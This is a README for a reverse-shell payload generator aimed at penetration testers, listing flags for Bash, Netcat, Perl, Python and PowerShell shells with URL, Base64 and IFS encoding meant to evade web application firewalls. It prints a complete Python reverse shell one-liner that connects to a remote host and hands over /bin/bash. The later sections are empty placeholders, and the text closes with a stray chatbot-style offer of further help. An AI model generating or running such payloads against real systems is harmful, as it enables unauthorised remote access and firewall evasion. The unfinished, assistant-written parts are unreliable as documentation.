### **What Is It?**
**Omni-Reverse-Payload-Generator** Is a versatile and powerful tool that enables security professionals to quickly generate reverse shell payloads offline using various programming languages and shells. What sets this tool apart is its ability to seamlessly integrate multiple advanced encoding techniques directly within the generated output, allowing payloads to be pre-encoded with layers of obfuscation to effectively bypass security measures like Web Application Firewalls (WAFs).

### **Key Features**
- **Multiple Reverse Payload Generation**: Quickly generate payloads for various environments, including Bash, Netcat, Perl, Python, PowerShell, and MSSQL, ensuring compatibility with different target systems.
- **Environment Testing**: Generate commands to identify and test shell environments, such as PowerShell/CMD (Windows) and Bash/Sh (Unix/Linux), to verify which shell the target supports.
- **Advanced Encoding Options**: Utilize encoding techniques like URL encoding, Base64, and Internal Field Separator (IFS) manipulation to obfuscate payloads and bypass WAFs.
- **Customization and Flexibility**: Customize payloads with options to modify shell behavior, encoding, and injection methods tailored for specific vulnerabilities like SSTI and command injection.

### **Installation**
```bash
git clone https://github.com/loganpkinfosec/omni-reverse-payload-generator/
cd omni-reverse-payload-generator
chmod +x *
```

### **Usage**

```bash
# Basic Usage Format
python3 Omni-Payload-Generator.py <payload_type> <LHOST> <LPORT> [options]

# Example Commands
python3 Omni-Payload-Generator.py -ps 10.10.14.20 443       # Generate PowerShell reverse shell
python3 Omni-Payload-Generator.py -b 10.10.14.20 443 -e     # Generate Bash reverse shell with URL encoding
python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection  # Generate Python 3 reverse shell with IFS manipulation for command injection
python3 Omni-Payload-Generator.py -y 10.10.14.20 443 -ifs ssti -e  # Python reverse shell for SSTI with URL encoding
```

### **Command Options/Swiches**
- `-b, --bash`: Generates a Bash reverse shell command.
- `-n, --netcat`: Generates a Netcat reverse shell command.
- `-p, --perl`: Generates a Perl reverse shell command.
- `-y, --python`: Generates a Python reverse shell command.
- `-y3, --python3`: Generates a Python 3 reverse shell command.
- `-ps, --powershell`: Generates a PowerShell reverse shell command in Base64.
- `-e, --urlencode`: URL encodes the generated reverse shell command.
- `-ifs, --use-ifs`: Uses IFS manipulation (`injection` or `ssti`) to replace spaces, enhancing payload delivery in specific scenarios.


**Example: Generating a Python3 Shell with IFS Manipulation**
```bash
Command: python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection
Output: python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.run(["/bin/bash","-i"]);'
```

### **7. Screenshots or Diagrams**
Include screenshots of the tool in action or diagrams showing the flow of payload generation. Visual aids help users quickly grasp the tool's functionality.

### **8. Common Issues and Troubleshooting**
Add a section that covers common issues users might face and how to resolve them. Examples might include permission errors, encoding issues, or incorrect usage of flags.

### **9. Contribution Guidelines**
Encourage contributions from the community by outlining how others can contribute, report bugs, or suggest features.

### **10. License and Acknowledgments**
Clearly state the licensing of your tool and acknowledge any inspirations or dependencies.

---

**Enhancements Summary:**
- **Structuring**: The documentation is organized into sections, making it easy for users to navigate and find information quickly.
- **Clarity**: Detailed explanations for each command and flag, supplemented by example commands and outputs.
- **Visuals**: Including screenshots or diagrams can further clarify the tool’s usage.
- **Troubleshooting**: Providing a section for common problems will improve user experience and reduce confusion.

Would you like help creating screenshots, diagrams, or further refining any of these sections?
